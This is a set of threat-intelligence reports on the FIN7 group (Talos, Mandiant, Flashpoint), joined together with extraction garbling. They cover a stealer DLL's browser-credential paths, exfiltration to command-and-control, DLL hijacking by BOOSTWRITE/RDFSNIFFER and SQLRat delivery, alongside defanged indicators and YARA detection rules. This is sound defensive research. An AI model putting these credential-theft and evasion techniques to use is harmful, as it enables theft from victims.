JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 8: Reordered Function Example Command and Control addresses are changed: Figure 9: Changed Command and Control Addresses Varying base64 encoding depths, which can be identi=ed using our scatter plot, such as the PowerShell write and execution functionality: Figure 10: PowerShell Write and Execute Functionality at Different Base64 Decoding Depths Which when compared vary in decoding depth but are the same functionality: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 7 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 11: Code Comparison PowerShell Write and Execute Functionality Stealer DLL Recovering the DLL One of the Dnal components of these JavaScript 'decoding chains' is a PowerShell refective DLL injection script which contains copy pasted functions fromPowersploit's Invoke-RefectivePEInjection. The DLL is de-obfuscated by decoding the base64 blob and uses IO.Compression.DefateStream to decompress the resulting bytes. In order to recover the DLL we can simply write the decompressed bytes to disk using [io.Dle]::WriteAllBytes. Figure 12: PowerShell stream decompression and writing DLL to disk Figure 13: Copy-Pasted PowerSploit Invoke-RefectivePEInjection Code https://blog.talosintelligence.com/fin7-stealer/#more Pagina 8 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Stealer DLL Functionality We wrote a blog post about the H1N1 dropper in August 2016, whichreferenced a string de-obfuscation script to handle multiple 32-bit value XOR, ADD, and SUB string obfuscation techniques. This script is able to handle similar functionality in this stealer DLL: Figure 14: Firefox String Decoding Import hashing functionality involves resolving the export table for a given DLL (common for packers/malware): Figure 15: PowerShell Injected DLL Hashing Functionality PE Offsets Then using XOR and ROL algorithm over given export values to compare against given hashes for exports to resolve: Figure 16: PowerShell Injected DLL Hashing Algorithm This DLL also contains similar stealer functionality, E.G the decryption of Intelliform data using CryptUnprotectData by hashing cached URLs: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 9 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 17: PowerShell Injected DLL Intelliform Data Stealing This binary also contains Outlook and Firefox stealer functionality and the ability to steal login information from Google Chrome, Chromium, forks of Chromium and Opera browsers that will be discussed in the next section. Chrome, Chromium and Opera Credential Stealing The Chrome, Chromium, Chromium forks and Opera credential stealing functionality opens the [Database Path]\Login Data sqlite3 database, reads the URL, username, and password Delds, and calls CryptUnprotectData to decrypt user passwords. The following paths are checked for this database under %APPDATA%, %PROGRAMDATA%, and %LOCALAPPDATA%: \Google\Chrome\User Data\Default\Login Data \Chromium\User Data\Default\Login Data \MapleStudio\ChromePlus\User Data\Default\Login Data \YandexBrowse\User Data\Default\Login Data \Nichrom\User Data\Default\Login Data \Comodo\Dragon\User Data\Default\Login Data Although Opera is not a fork of Chromium, the newest version has credentials with the same implementation under the path: \Opera Software\Opera Stable\Login Data Stolen Data Command and Control In addition to the JavaScript bot functionality, the stolen data is dumped to %APPDATA%\%USERNAME%.ini and sets the Dle creation time to be that of ntdll.dll. This data is read and encrypted using the SimpleEncrypt function, which as their name implies, is a simple substitution cipher: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 10 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 18: Command and Control Data Substitution Cipher This is then POSTed to a hardcoded command and control addresses, including the Google Apps Script hosting service (also notice the alfIn variable declaration which is the alphabet used for the substitution cipher): Figure 19: Command and Control Data ExDltration JavaScript Functionality This is again using the comment block evasion technique. AMP Coverage The AMP for Endpoints and Threat Grid product lines are ideal for dealing with this threat, as they can use both static and dynamic activity to detect malicious activity. AMP Threat Grid Without clicking on the embedded OLE object within the document Threat Grid can provide insight into possible malicious activity using static attributes https://blog.talosintelligence.com/fin7-stealer/#more Pagina 11 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 alone. Embedded functionality is automatically extracted by Threat Grid, in this instance the embedded LNK OLE object contains seemingly malicious commands that are executed when clicked: Figure 20: Document LNK Command Prompt Static Attributes Figure 21: Active Document LNK Static Attributes The OLE object can be clicked on within the document during the Threat Grid run using the Open Embedded Object in Word Document playbook, which will automatically execute the embedded object during the Threat Grid run when selected from the submission dropdown menu: Figure 22: Selecting Playbook from Submission Menu A depiction of this automated user interaction can be seen below: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 12 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 23: Clicking on Document OLE Object Through Playbook When clicked additional behavioral indicators are triggered based on dynamic behavior: Figure 24: Dynamic Activity Caused by Clicking the OLE Object Task creations (used by the JavaScript bot for periodic execution of components) can also be observed: Figure 25: Task Creation Dynamic Activity The JavaScript content that is periodically executed can be seen the Artifacts section and can be downloaded or resubmitted for further analysis: Figure 26: Written JavaScript Artifact Objects https://blog.talosintelligence.com/fin7-stealer/#more Pagina 13 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 This intelligence is then integrated back into the AMP cloud protecting all customers who may be targeted by similar attack methodologies. AMP for Endpoints AMP for Endpoints has the ability to observe dynamic activity through a number of methods. One of these is the capture of command line arguments which are then sent to the AMP cloud for analysis. In this case, we're able to observe the execution of wscript.exe when the OLE object is clicked: Figure 27: Captured Command Line Arguments in AMP for Endpoints Device Trajectory This triggers an Indicator of Compromise which can then be further investigated: https://blog.talosintelligence.com/fin7-stealer/#more Pagina 14 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Figure 28: Indicator of Compromise from Captured Command Line Arguments Conclusion The FIN7 group is an example of an advanced adversary targeting a variety of industries using conventional technologies that ship with most versions of Microsoft Windows. Through the use of Microsoft Word documents to ship entire malware platforms they have the ability to leverage scripting languages to access ActiveX controls, and ""Kle-less"" techniques to inject shipped portable executables into memory using PowerShell without ever having the portable executable touch disk. Clustering JavaScript also demonstrates a number of ways FIN7 makes minor changes between releases, and establishes outliers to observe major changes. Through the observation of static and dynamic attributes we're able to establish indicators of compromise based on the embedded OLE object which can be used to identify FIN7 documents, and identify documents which may be leveraging similar functionality to protect our customers. Coverage Talos has released the following Snort rule(s) to address this threat. Please note that additional rules may be released at a future date and current rules are subject to change pending additional information. Firepower customers should use the latest update to their ruleset by updating their SRU. Open Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. Snort Rules: 44430-44433 Additional ways our customers can detect and block this threat are listed below. Advanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. CWS orWSA web scanning prevents access to malicious websites and detects malware used in these attacks. Email Security can block malicious emails sent by threat actors as part of their campaign. Network Security appliances such as NGFW, NGIPS, and Meraki MX can detect malicious activity associated with this threat. AMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. https://blog.talosintelligence.com/fin7-stealer/#more Pagina 15 di 18 FIN7 Group Uses JavaScript and Stealer DLL Variant in New Attacks 07/09/24, 12:51 Umbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. Indicators of Compromise JavaScript Bot Documents 6bc8770206c5f2bb4079f7583615adeb4076f2e2d0c655fbafedd9669dc3a213 df22408833b2ae58f0d3e2fe87581be31972ef56e0ebf5efafc4e6e0341b5521 2b4991b2a2792436b50404dcf6310ef2af2573505810ebac08e32f17aee3fbbe ebca565e21a42300e19f250f84b927fa3b32debf3fe13003a4aa5b71ed5cbee9 6604d806eb68fdf914dfb6bbf907a4f2bd9b8757fc4da4e7c5e4de141b8d4e2c JavaScript Bot Documents with PowerShell DLL Injection 91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676 ad578311d43d3aea3a5b2908bc6e408b499cc832723225ff915d9a7bc36e0aa4 fadb57aa7a82dbcb2e40c034f52096b63801efc040dd8559a4b8fc873bc962a1 91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676 74a5471c3aa6f9ce0c806e85929c2816ac39082f7fea8dbe8e4e98e986d4be78 f73c7ed3765fec13ffd79aef97de519cfbd6a332e81b8a247fe7d1ccb1946c9c Command and Control IPs 104[.]232[.]34[.]36 5[.]149[.]253[.]126 185[.]180[.]197[.]20 195[.]54[.]162[.]79 31[.]148[.]219[.]18 Google Apps Script Command and Control URLs hXXps://script[.]google[.]com/macros/s/AKfycbxvGGF- QBkaNIWCBFgjohBtkmyfyRpvm91yCGEvzgDvAJdqfW8_/exec hXXps://script[.]google[.]com/macros/s/AKfycbz6dmNJfCPwFchoq6WkJsMjQu22SJTJ9pxMUeQR7bCpmJhW6Bg2/exec hXXps://script[.]google[.]com/macros/s/AKfycbwkNc- 8rk0caDWO5I4KMymvOXVinfOpR1eevZ63xiXDvcoqOE6p/exec hXXps://script[.]google[.]com/macros/s/AKfycbxyiIBW9SHUFV4S5JM6IW- dmVADFOrTJDM7bZspeBf2Kpf4IN0/exec S H A R E T H I S P O S T RELATED CONTENT Vulnerability in Tencent WeChat custom browser could lead to remote https://blog.talosintelligence.com/fin7-stealer/#more Pagina 16 di 18"
fin7,cti-hal,7631709634a4,G0046,"Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 Cloud Contact sales Get started for free Blog Solutions & technology Ecosystem Developers & Practitioners Transform with Google Cloud Threat Intelligence Mahalo FIN7: Responding to the Criminal Operators’ New Tools and Techniques October 10, 2019 Mandiant Wri!en by: Nick Carr, Josh Yoder, Kimberly Goody, Sco! Runnels, Jeremy Kennelly, Jordan Nuce During several recent incident response engagements, FireEye Mandiant investigators uncovered new tools in FIN7’s malware arsenal and kept pace as the global criminal operators a!empted new evasion techniques. In this blog, we reveal two of FIN7’s new tools that we have called BOOSTWRITE and RDFSNIFFER. The ""rst of FIN7's new tools is BOOSTWRITE – an in-memory-only dropper that decrypts embedded payloads using an encryption key retrieved from a remote server at runtime. FIN7 has been observed making small changes to this malware family using multiple methods to avoid traditional antivirus detection, including a BOOSTWRITE sample where the dropper was signed by a valid Ce#i""cate Authority. One of the analyzed BOOSTWRITE variants contained two payloads: CARBANAK and RDFSNIFFER. While CARBANAK has been thoroughly analyzed and has been used maliciously by several ""nancial a!ackers including FIN7, RDFSNIFFER is a newly-identi""ed tool recovered by Mandiant investigators. RDFSNIFFER, a payload of BOOSTWRITE, appears to have been developed to tamper with NCR Corporation's “Aloha Command Center” client. NCR Aloha Command Center is a remote https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 1 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 administration toolset designed to manage and troubleshoot systems within payment card processing sectors running the Command Center Agent. The malware loads into the same process as the Command Center process by abusing the DLL load order of the legitimate Aloha utility. Mandiant provided this information to NCR. BOOSTWRITE Loader: Where You At? BOOSTWRITE is a loader cra$ed to be launched via abuse of the DLL search order of applications which load the legitimate ‘Dwrite.dll’ provided by the Microso$ DirectX Typography Services. The application loads the ‘gdi’ library, which loads the ‘gdiplus’ library, which ultimately loads ‘Dwrite’. Mandiant identi""ed instances where BOOSTWRITE was placed on the ""le system alongside the RDFClient binary to force the application to impo# DWriteCreateFactory from it rather than the legitimate DWrite.dll. Once loaded, `DWrite.dll` connects to a hard-coded IP and po# from which it retrieves a decryption key and initialization vector (IV) to decrypt two embedded payload DLLs. To accomplish this task, the malware ""rst generates a random ""le name to be used as a text log under the current user's %TEMP% directory; this ""lename sta#s with ~rdf and is followed by a set of random numbers. Next, the malware scans its own image to ""nd the location of a 32-byte long multi-XOR key which is used to decode data inside its body. Pa# of the decoded data is an IP address and po# which are used to retrieve the key and the IV for the decryption of the embedded payloads. The encryption algorithm uses the ChaCha stream cipher with a 256-bit key and 64-bit IV. Once the key and the IV are downloaded the malware decrypts the embedded payloads and pe%orms sanity checks on the results. The payloads are expected to be PE32.DLLs which, if the tests pass, are loaded into memory without touching the ""lesystem. The malware logs various plaintext messages to the previously created log""le %TEMP%\~rds<rnd_numbers> which are indicative of the loader’s execution progress. An example of the ""le content is shown in Figure 1: Loading... Starting... Init OK https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 2 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 Key OK Data: 4606941 HS: 20 K:[32] V:[8] DCnt: 732642317(ERR) Figure 1: BOOSTWRITE log !le Before exiting, the malware resolves the location of the benign DWrite.dll library and passes the execution control to its DWriteCreateFactory method. The malware decrypts and loads two payload DLLs. One of the DLLs is an instance of the CARBANAK backdoor; the other DLL is a tool tracked by FireEye as RDFSNIFFER which allows an a!acker to hijack instances of the NCR Aloha Command Center Client application and interact with victim systems via existing legitimate 2FA sessions. RDFSNIFFER Module: We Smell a RAT RDFSNIFFER is a module loaded by BOOSTWRITE which allows an a!acker to monitor and tamper with legitimate connections made via NCR Corporation’s ‘Aloha Command Center Client’ (RDFClient), an application designed to provide visibility and system management capabilities to remote IT techs. RDFSNIFFER loads into the same process as the legitimate RDFClient by abusing the utility’s DLL load order, launching each time the ‘Aloha Command Center Client’ is executed on an impacted system. When the RDFSNIFFER module is loaded by BOOSTWRITE it hooks several Win32 API functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-inte%ace (Table 1). Fu#hermore, this enables the malware to alter the user’s last input time to ensure application sessions do not time out. Win32 API Function Hook Description Ce#VerifyCe#i""cateChainPolicy Ce#GetCe#i""cateChain Used to man-in-the- middle SSL sessions Used to man-in-the- middle SSL sessions https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 3 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 WSAConnect connect ConnectEx Used to man-in-the- middle socket connections Used to man-in-the- middle socket connections Used to man-in-the- middle socket connections DispatchMessageW Used to hijack the utility's UI DispatchMessageA Used to hijack the utility's DefWindowProcW DefWindowProcA GetLastInputInfo UI Used to hijack the utility's UI Used to hijack the utility's UI Used to change the user's last input time (to avoid timed lock outs) Table 1: RDFSNIFFER’s Hooked Win32 API Functions This module also contains a backdoor component that enables it to inject commands into an active RDFClient session. This backdoor allows an a!acker to upload, download, execute and/or delete arbitrary ""les (Table 2). Command Legit Function Name in RDFClient RDFClient Command Description ID Uploads a ""le to the https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 4 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 Upload FileMgrSendFile 107 Download FileMgrGetFile 108 Execute RunCommand 3001 DeleteRemote FileMgrDeleteFile 3019 DeleteLocal - - Table 2: RDFSNIFFER’s Backdoor Functions Signed: Yours Truly, FIN7 remote system Retrieves a ""le from the remote system Executes a command on the remote system Deletes ""le on remote system Deletes a local ""le While the majority of BOOSTWRITE variants recovered from investigations have been unsigned, Mandiant identi""ed a signed BOOSTWRITE sample used by FIN7 during a recent investigation. Following that discovery, a signed BOOSTWRITE sample was uploaded to VirusTotal on October 3. This executable uses a code signing ce#i""cate issued by MANGO ENTERPRISE LIMITED (Table 3). MD5 Organization Country a67d6e87283c34459b4660f19747a306 ENTERPRISE GB LIMITED mango https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 5 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 Table 3: Code signing ce""i!cate used for BOOSTWRITE This indicates the operators may be actively altering this malware to avoid traditional detection mechanisms. Notably, the signed BOOSTWRITE sample had a 0/68 detection ratio when it was uploaded to VirusTotal, demonstrating the e'ectiveness of this tactic (Figure 2). Figure 2: Current VirusTotal detection ratio for signed BOOSTWRITE Use of a code signing ce#i""cate for BOOSTWRITE is not a completely new technique for FIN7 as the group has used digital ce#i""cates in the past to sign their phishing documents, backdoors, and later stage tools. By exploiting the trust inherently provided by code ce#i""cates, FIN7 increases their chances of bypassing various security controls and successfully compromising victims. The full evasion achieved against the detection engines deployed to VirusTotal – as compared to an unsigned BOOSTWRITE sample with an invalid checksum– illustrates that FIN7’s methods were e'ective in subve#ing both traditional detection and ML binary classi""cation engines. This is a known issue and has been deeply studied since at least 2016’s “Chains of Distrust” research and 2017’s “Ce#i""ed Malware” paper. Since there are plenty of goodware samples with bad or no signatures – and a growing number of malware samples with good signatures – there is no easy solution here. The upside is that vendors selectively deploy engines to VirusTotal (including FireEye) and VT detection pe%ormance o$en isn’t a comprehensive representation of encountering full security technology stacks that implement detection-in-depth. Later in this blog we fu#her explore BOOSTWRITE’s PE Authenticode signature, its anomalies, and how code signing can be turned from a detection challenge into detection oppo#unities. Outlook and Implications While these incidents have also included FIN7’s typical and long- used toolsets, such as CARBANAK and BABYMETAL, the introduction of new tools and techniques provides fu#her https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 6 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 evidence FIN7 is continuing to evolve in response to security enhancements. Fu#her, the use of code signing in at least one case highlights the group's judicious use of resources, potentially limiting their use of these ce#i""cates to cases where they have been a!empting to bypass pa#icular security controls. Barring any fu#her law enforcement actions, we expect at least a po#ion of the actors who comprise the FIN7 criminal organization to continue conducting campaigns. As a result, organizations need to remain vigilant and continue to monitor for changes in methods employed by the FIN7 actors. Sigs Up Dudes! Indicators, Toolmarks, and Detection Opportunities While FireEye does not release our production detection logic for the code families, this section does contain some identi""cation and hunting concepts that we adopt in our layered detection strategy. Table 4 contains malware samples referenced in this blog that FireEye is able to share from the larger set recovered during active investigations. Type Indicator(s) MD5: a67d6e87283c34459b4660f19747a306 SHA-1: a873f3417d54220e978d0ca9ceb63cf13ec71f84 BOOSTWRITE SHA-256: (signed) 18cc54e2(dad5a317b6aeb2e7db3973cc5)01bbf810869d79e9cb3bf02bd5 C2: 109.230.199[.]227 MD5: af2f4142463f42548b8650a3adf5ceb2 SHA1: 09f3c9ae382(d29(47ecdfeb3bb149d7e961a1 BOOSTWRITE SHA256: (unsigned) 8773aeb53d9034dc8de339651e61d8d6ae0a895c4c89b670d501db8dc60cd2d0 C2: 109.230.199[.]227 Table 4: Publicly-shareable BOOSTWRITE samples The signed BOOSTWRITE sample has a PE Authenticode anomaly that can be detected using yara’s PE signature module. Speci""cally, the PE linker timestamp is prior to the Authenticode validity period, as seen in Table 5. https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 7 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 Timestamp Description 2019-05-20 09:50:55 Signed BOOSTWRITE’s PE compilation time UTC 2019-05-22 00:00 UTC through 2020-05-21 23:59 UTC Signed BOOSTWRITE’s “mango ENTERPRISE LIMITED” ce#i""cate validity window Table 5: Relevant executabe timestamps A public example of a Yara rule covering this pa#icular PE Authenticode timestamp anomaly is available in a blog post from David Cannings, with the key logic shown in Figure 3. pe.number_of_signatures > 0 and not for all i in (0..pe.number_of_signatures - 1): pe.signatures[i].valid_on(pe.timestamp) Figure 3: Excerpt of NCC Group’s research Yara rule There are other PE Authenticode anomalies that can also be represented as Yara rules to su%ace similarly suspicious ""les. Of note, this signed BOOSTWRITE sample has no counter signature and, while the unauthenticated a!ributes timestamp structure is present, it is empty. In preparing this blog, FireEye’s Advanced Practices team identi""ed a possible issue with VirusTotal’s parsing of signed executable timestamps as seen in Figure 4. Figure 4: Inconsistency in VirusTotal !le signature timestamps for the signed BOOSTWRITE sample FireEye ""led a bug repo# with Google to address the discrepancy in VirusTotal in order to remove confusion for other users. To account for the detection weaknesses introduced by techniques like code signing, our Advanced Practices team combines the malicious con""dence spectrum that comes from ML detection systems with ""le oddities and anomalies (weak signals) https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 8 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 to su%ace highly interesting and evasive malware. This technique was recently described in our own Dr. Steven Miller’s De""nitive Dossier of Devilish Debug Details. In fact, the exact same program database (PDB) path-based approach from his blog can be applied to the toolmarks seen in this sample for a quick hunting rule. Figure 5 provides the PDB path of the BOOSTWRITE samples from this blog. F:\projects\DWriteImpl\Release\DWriteImpl.pdb Figure 5: BOOSTWRITE PDB path The Yara rule template can be applied to result in the quick rule in Figure 6. rule ConventionEngine_BOOSTWRITE { meta: author = ""Nick Carr (@itsreallynick)"" reference = ""https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html"" strings: $weetPDB = /RSDS[\x00-\xFF]{20}[a-zA-Z]?:?\\[\\\s|*\s]?.{0,250}\\DWriteImpl[\\\s|*\s]?.{0,250}\.pdb\x00/ nocase condition: (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550 and $weetPDB and filesize < 6MB } Figure 6: Applying BOOSTWRITE’s PDB path to a Yara rule We can apply this same concept across other executable traits, such as BOOSTWRITE’s expo# DLL name (DWriteImpl.dll), to create quick and easy rules that can aid in quick discovery as seen in Figure 7. rule Exports_BOOSTWRITE { meta: author = ""Steve Miller (@stvemillertime) & Nick Carr (@itsreallynick)"" strings: $exyPants = ""DWriteImpl.dll"" nocase condition: uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and $exyPants at pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address) + 12)) and filesize < 6MB } Figure 7: Applying BOOSTWRITE’s expo"" DLL names to a Yara rule (Note: https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 9 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 this rule was updated following publication. It previously read ""module_ls.dll"", which is for Turla and unrelated.) Of course, resilient prevention capabilities are needed and to that end, FireEye detects this activity across our pla*orms. Table 6 contains several speci""c detection names from a larger list of detection capabilities that captured this activity natively. Pla!orm Signature Name Endpoint Security MalwareGuard ML detection (unsigned variants) Network Security and Email Security Malware.binary.dll (dynamic detection) MalwareGuard ML detection (unsigned variants) APTFIN.Dropper.Win.BOOSTWRITE (network tra+c) APTFIN.Backdoor.Win.RDFSNIFFER (network tra+c) FE_APTFIN_Dropper_Win_BOOSTWRITE (static code family detection) FE_APTFIN_Backdoor_Win_RDFSNIFFER (static code family detection) Table 6: FireEye detection matrix Don’t Sweat the Techniques – MITRE ATT&CK Mappings BOOSTWRITE ID Tactic BOOSTWRITE Context T1022 Data Encrypted stream cipher with a 256- BOOSTWRITE encodes its payloads using a ChaCha bit key and 64-bit IV to evade detection BOOSTWRITE encodes its payloads using a ChaCha https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 10 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 T1027 Obfuscated Files or Information payloads using a ChaCha stream cipher with a 256- bit key and 64-bit IV to evade detection BOOSTWRITE exploits the applications’ loading of the T1038 DLL Search Order ‘gdi’ library, which loads Hijacking the ‘gdiplus’ library, which ultimately loads the local ‘Dwrite’ dll BOOSTWRITE variants T1116 Code Signing were observed signed by a valid CA BOOSTWRITE exploits the applications’ loading of the T1129 Execution through ‘gdi’ library, which loads Module Load the ‘gdiplus’ library, which ultimately loads the local ‘Dwrite’ dll BOOSTWRITE decodes its payloads at runtime using using a ChaCha stream cipher with a 256-bit key and 64-bit IV T1140 Deobfuscate/Decode Files or Information RDFSNIFFER ID Tactic RDFSNIFFER Context RDFSNIFFER hooks several Win32 API Execution functions intended to enable it to T1106 through tamper with NCR Aloha Command API Center Client sessions or hijack elements of its user-inte%ace T1107 File RDFSNIFFER has the capability of Deletion deleting local ""les RDFSNIFFER hooks several Win32 API https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 11 di 13 Mahalo FIN7: Responding to the Criminal Operators' New Tools and Techniques | Mandiant | Google Cloud Blog 04/09/24, 11:56 T1179 Hooking functions intended to enable it to tamper with NCR Aloha Command Center Client sessions or hijack elements of its user-inte%ace Acknowledgements The authors want to thank Steve Elovitz, Jeremy Koppen, and the many Mandiant incident responders that go toe-to-toe with FIN7 regularly, quietly evicting them from victim environments. We appreciate the thorough detection engineering from Ayako Matsuda and the reverse engineering from FLARE’s Dimiter Andonov, Christopher Gardner and Tyler Dean. A special thanks to FLARE’s Troy Ross for the development of his PE Signature analysis service and for answering our follow-up questions. Shout out to Steve Miller for his hot ""re research and Yara anomaly work. And lastly, the rest of the Advanced Practices team for both the unparalleled front-line FIN7 technical intelligence expe#ise and MITRE ATT&CK automated mapping project – with a pa#icular thanks to Regina Elwell and Barry Vengerik. Posted in Threat Intelligence—Security & Identity Related articles Threat Intelligence Threat Intelligence Threat Intelligence Threat Intelligence DeFied Expectations — Examining Web3 Heists By Mandiant • 18-minute read A Measure of Motive: How A!ackers Weaponize Digital Analytics Tools I Spy With My Li!le Eye: Uncovering an Iranian Counterintelligence Operation PEAKLIGHT: Decoding the Stealthy Memory- Only Malware By Mandiant • 22-minute By Mandiant • 23-minute By Mandiant • 13-minute read read read https://cloud.google.com/blog/topics/threat-intelligence/mahalo-fin7-responding-to-new-tools-and-techniques/ Pagina 12 di 13"
fin7,cti-hal,33d9f35c0295,G0046,"FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 FIN7 Revisited: Inside Astra Panel and SQLRat Malware Despite the arrests of three prominent members of the FIN7 cybercrime gang beginning in January 2018, attacks targeting businesses and customer payment card information did not cease. Flashpoint Intel Team March 20, 2019 By Joshua Platt and Jason Reaves Despite the arrests of three prominent members of the FIN7 cybercrime gang beginning in January 2018, attacks targeting businesses and customer payment card information did not cease. The latest evidence involves the discovery of a new administrative panel and previously unseen malware samples that Flashpoint analysts are linking to this notorious group. Activity from this campaign dates from May to July 2018, but could go back farther to January 2018. FIN7 has been active since at least 2015, targeting more than 100 U.S.- based companies in 47 states, as well as businesses in Europe and Australia. The U.S. companies affected were operating primarily in the hospitality, restaurant, and gaming industries, according to a U.S. Department of Justice press release last Aug. 1 announcing the arrest of three Ukrainian nationals alleged to be members of FIN7. Two were arrested in January in Germany and Poland, while the third—an alleged supervisor—was arrested in June in Spain. FIN7, which has also used a backdoor linked to Carbanak—another prolific cybercrime outfit responsible for billions in losses in the financial services https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 1 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 industry—has stolen more than 15 million payment card records from American businesses. The group, which operated behind a front company called Combi Security, has infiltrated more than 6,500 individual point-of- sale terminals at more than 3,600 business locations, according to the DoJ. New Attack Panel and Malware Samples Flashpoint analysts recently uncovered a new attack panel used by this group in campaigns they have called Astra. The panel, written in PHP, functions as a script-management system, pushing attack scripts down to compromised computers. Analysts discovered references to the FIN7 front company Combi Security in the Astra panel’s backend PHP code, connecting the group to these campaigns. According to the DoJ indictments, Combi Security purported itself as a penetration-testing and security services company based in Russia and Israel. The DoJ alleges FIN7 portrayed Combi Security as a legitimate business in order to recruit other hackers to their operation. The attackers gain an initial foothold on targeted machines via phishing emails containing malicious attachments. The emails are often industry- specific and crafted to entice a victim to open the message and execute the attached document. One of the documents spreads what analysts are calling SQLRat, previously unseen malware that drops files and executes SQL scripts on the host system. The use of SQL scripts is ingenious in that they don’t leave artifacts behind the way traditional malware does. Once they are deleted by the attackers’ code, there is nothing left to be forensically recovered. This technique has not been observed in previous campaigns associated with FIN7. The second new malware sample discovered is a multiprotocol backdoor https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 2 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 called DNSbot, which is used to exchange commands and push data to and from compromised machines. Primarily, it operates over DNS traffic, but can also switch to encrypted channels such as HTTPS or SSL, Flashpoint analysts discovered. The campaigns maintain persistence on machines by creating two daily scheduled task entries. The code, meanwhile, is still controlled by the FIN7 actors and may be leveraged in future attacks by the group. SQLRat Technical Details SQLRat campaigns typically involved a lure document that included an image overlayed by a VB Form trigger. The documents contained a message asking the user to “Unlock Protected Contents,” below, while showing a message box displaying “US SEC Unlock document service.” Image 1: An image of a document used in a typical campaign. Once a user has double-clicked the embedded image, the form executes a VB setup script. The script writes files to the path %appdata%\Roaming\Microsoft\Templates\, then creates two task entries https://flashpoint.io/blog/fin7-revisited-inside-astra-panel-and-sqlrat-malware/ Pagina 3 di 14 FIN7 Revisited: Inside Astra Panel and SQLRat Malware | Flashpoint 05/09/24, 15:58 triggered to run daily. Image 2: Executing scripts on disk. The scripts are responsible for deobfuscating and executing the main JavaScript file mspromo.dot. The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters. Image 3: Obfuscated mspromo file. After deobfuscating the file, the main JavaScript is easily recognizable. It contains a number of functions designed to drop files and execute scripts on a host system. Image 4: Deobfuscated mspromo script.= The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables. The script retrieves an item from the bindata table and writes the file to disk. This file appears to primarily be a version of 